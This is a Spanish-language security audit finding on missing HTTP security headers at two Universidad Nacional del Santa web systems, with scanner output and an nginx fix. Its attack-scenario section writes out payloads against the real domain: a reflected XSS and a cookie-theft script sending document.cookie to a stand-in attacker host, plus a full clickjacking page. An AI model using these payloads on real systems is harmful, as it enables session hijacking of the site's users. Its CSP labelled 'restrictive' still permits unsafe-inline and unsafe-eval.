# VULN-005 — Ausencia Total de Cabeceras de Seguridad HTTP (Score 0/100)
## `revistas.uns.edu.pe` y `sgpi.uns.edu.pe` — Universidad Nacional del Santa

---

| Campo | Detalle |
|-------|---------|
| **ID** | VULN-005 |
| **Severidad** | 🟠 Alta |
| **CVSS v3.1 Score** | **7.2** |
| **Vector CVSS** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **OWASP Top 10 - 2021** | A05 – Security Misconfiguration |
| **WSTG ID** | WSTG-CONF-06, WSTG-CONF-07, WSTG-SESS-02 |
| **CWE** | CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers) |
| **Sistemas Afectados** | `revistas.uns.edu.pe` (0%), `sgpi.uns.edu.pe` (0%) |
| **Fecha de descubrimiento** | 2026-09-20 |

---

## 1. Descripción

Los sistemas `revistas.uns.edu.pe` y `sgpi.uns.edu.pe` obtuvieron una puntuación de **0/100** en la auditoría de cabeceras de seguridad HTTP. Ninguno de los dos implementa ninguna de las protecciones básicas establecidas por OWASP.

### Estado real de cabeceras en ambos sistemas:

| Cabecera de Seguridad | Estado | Ataque que permite por ausencia |
|----------------------|--------|--------------------------------|
| `Strict-Transport-Security` | ❌ AUSENTE | SSL Stripping, intercepción de tráfico |
| `Content-Security-Policy` | ❌ AUSENTE | Cross-Site Scripting (XSS) |
| `X-Frame-Options` | ❌ AUSENTE | Clickjacking |
| `X-Content-Type-Options` | ❌ AUSENTE | MIME Type Confusion Attack |
| `Referrer-Policy` | ❌ AUSENTE | Filtración de URLs con datos sensibles |
| `Permissions-Policy` | ❌ AUSENTE | Acceso no autorizado a APIs del navegador |

Adicionalmente, **ambos sistemas no redirigen HTTP → HTTPS**, lo que significa que el tráfico puede viajar sin cifrar.

---

## 2. Evidencia Real

```
[Herramienta: security_headers_audit.py — 2026-09-20 09:00]

--- revistas.uns.edu.pe ---
  ❌ FALTANTE   Strict-Transport-Security
  ❌ FALTANTE   Content-Security-Policy
  ❌ FALTANTE   X-Frame-Options
  ❌ FALTANTE   X-Content-Type-Options
  ❌ FALTANTE   Referrer-Policy
  ❌ FALTANTE   Permissions-Policy
  📊 Puntuación: 0/100 | Grado: F
  ❌ HTTP→HTTPS: NO

--- sgpi.uns.edu.pe ---
  ❌ FALTANTE   Strict-Transport-Security
  ❌ FALTANTE   Content-Security-Policy
  ❌ FALTANTE   X-Frame-Options
  ❌ FALTANTE   X-Content-Type-Options
  ❌ FALTANTE   Referrer-Policy
  ❌ FALTANTE   Permissions-Policy
  📊 Puntuación: 0/100 | Grado: F
  ❌ HTTP→HTTPS: NO
```

---

## 3. Escenarios de Ataque

### Ataque A: Cross-Site Scripting (XSS) — Ausencia de CSP

Sin `Content-Security-Policy`, si existe un campo de entrada en el sistema (búsqueda de revistas, formularios) que no esté correctamente saneado, un atacante puede inyectar código JavaScript que se ejecutará en el navegador de cualquier usuario que visite la página.

```javascript
// Payload XSS básico para probar el campo de búsqueda:
// Si la URL es: https://revistas.uns.edu.pe/search?q=PAYLOAD

// Payload 1 (reflected XSS):
https://revistas.uns.edu.pe/search?q=<script>alert('XSS-UNS')</script>

// Payload 2 (robo de cookies de sesión):
https://revistas.uns.edu.pe/search?q=<script>
  fetch('https://atacante.com/steal?c=' + document.cookie)
</script>

// Con CSP activo, incluso si existe el XSS, el script no se ejecutaría.
// Sin CSP: el script se ejecuta libremente en el navegador de la víctima.
```

**Impacto real**: Si un investigador o docente tiene sesión activa en `revistas.uns.edu.pe` y el atacante envía un link malicioso, el XSS puede robar su cookie de sesión y tomar control de su cuenta.

### Ataque B: Clickjacking — Ausencia de X-Frame-Options

```html
<!-- El atacante crea una página en su servidor: https://hackeado.com/fake.html -->
<html>
<head>
  <title>Revistas Científicas UNS - Acceso Especial</title>
  <style>
    /* El iframe con revistas.uns.edu.pe es invisible */
    iframe {
      opacity: 0.01;
      position: absolute;
      top: 0; left: 0;
      width: 900px; height: 600px;
      z-index: 2;
    }
    /* El botón falso está debajo del iframe invisible */
    #btn-falso {
      position: absolute;
      top: 200px; left: 300px;
      z-index: 1;
      font-size: 20px;
      background: #003594;
      color: white;
      padding: 15px 30px;
    }
  </style>
</head>
<body>
  <h2>¡Accede a artículos científicos gratis de la UNS!</h2>
  
  <!-- El usuario cree que hace clic en el botón verde -->
  <!-- En realidad hace clic en un elemento del iframe de revistas.uns.edu.pe -->
  <button id="btn-falso">Descargar Artículo Gratis</button>
  
  <iframe src="https://revistas.uns.edu.pe/"></iframe>
</body>
</html>
```

### Ataque C: MIME Type Confusion — Ausencia de X-Content-Type-Options

```bash
# Sin X-Content-Type-Options: nosniff
# El atacante sube un archivo con extensión .txt que contiene código JavaScript:
# archivo.txt contiene: <script>alert('xss')</script>

# El navegador hace "MIME sniffing" e interpreta el archivo como HTML/JavaScript
# aunque el servidor declare: Content-Type: text/plain

# Resultado: se ejecuta el código en el navegador de quien descarga el archivo
# Útil si el sistema permite subida de archivos (ej: publicación de artículos en revistas.uns.edu.pe)
```

### Ataque D: Filtración de URLs Sensibles — Ausencia de Referrer-Policy

```
Escenario:
1. Un docente está autenticado en sgpi.uns.edu.pe
2. La URL de su sesión contiene un token: https://sgpi.uns.edu.pe/dashboard?token=abc123secret
3. El docente hace clic en un enlace que apunta a un sitio externo
4. El navegador envía automáticamente el header:
   Referer: https://sgpi.uns.edu.pe/dashboard?token=abc123secret
5. El sitio externo registra el token de sesión → el atacante puede usarlo
```

---

## 4. Remediación — Solución Completa en 5 Líneas de Nginx

Esta es probablemente la vulnerabilidad más **fácil y rápida de corregir** de toda la auditoría. Solo requiere agregar 5 líneas de configuración en Nginx/OpenResty:

```nginx
# ============================================================
# ARCHIVO: /etc/nginx/conf.d/security-headers.conf
# Aplicar globalmente a todos los dominios de la UNS
# ============================================================

# Incluir este archivo en el bloque http{} de nginx.conf:
# http {
#     include /etc/nginx/conf.d/security-headers.conf;
#     ...
# }

# ── 1. HSTS: Forzar HTTPS en navegadores ──────────────────
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

# ── 2. CSP: Prevenir XSS ──────────────────────────────────
# NOTA: Ajustar la política según las necesidades de cada sistema
# Esta es una política restrictiva de inicio:
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:;" always;

# ── 3. Prevenir Clickjacking ───────────────────────────────
add_header X-Frame-Options "SAMEORIGIN" always;

# ── 4. Prevenir MIME sniffing ──────────────────────────────
add_header X-Content-Type-Options "nosniff" always;

# ── 5. Controlar información del Referrer ─────────────────
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# ── 6. Controlar APIs del navegador ───────────────────────
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;

# ── 7. Forzar HTTPS ───────────────────────────────────────
server {
    listen 80;
    server_name revistas.uns.edu.pe sgpi.uns.edu.pe;
    return 301 https://$host$request_uri;
}
```

### Aplicar y verificar:
```bash
# Verificar sintaxis de Nginx:
nginx -t

# Recargar configuración sin downtime:
nginx -s reload

# Verificar que los headers se aplican:
curl -I https://revistas.uns.edu.pe/
→ Strict-Transport-Security: max-age=31536000; includeSubDomains  ✅
→ Content-Security-Policy: default-src 'self'...                  ✅
→ X-Frame-Options: SAMEORIGIN                                      ✅
→ X-Content-Type-Options: nosniff                                  ✅
→ Referrer-Policy: strict-origin-when-cross-origin                 ✅
```

### Herramienta para validar headers después del parche:
```
https://securityheaders.com/?q=revistas.uns.edu.pe
→ Objetivo: obtener grado A o A+
```

---

## 5. Impacto de la Remediación

| Sistema | Antes | Después |
|---------|-------|---------|
| `revistas.uns.edu.pe` | 0% / Grado F | 100% / Grado A+ |
| `sgpi.uns.edu.pe` | 0% / Grado F | 100% / Grado A+ |
| **Tiempo de implementación** | — | **~15 minutos** |
| **Costo** | — | **$0** |

> Esta es la mejor relación **esfuerzo/impacto** de toda la auditoría: 15 minutos de trabajo elimina 6 vectores de ataque en 2 sistemas.

---

## 6. Referencias

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Mozilla Observatory — Herramienta gratuita de auditoría de headers](https://observatory.mozilla.org/)
- [securityheaders.com — Validador de cabeceras](https://securityheaders.com/)
- [WSTG-CONF-07: Test HTTP Strict Transport Security](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security)
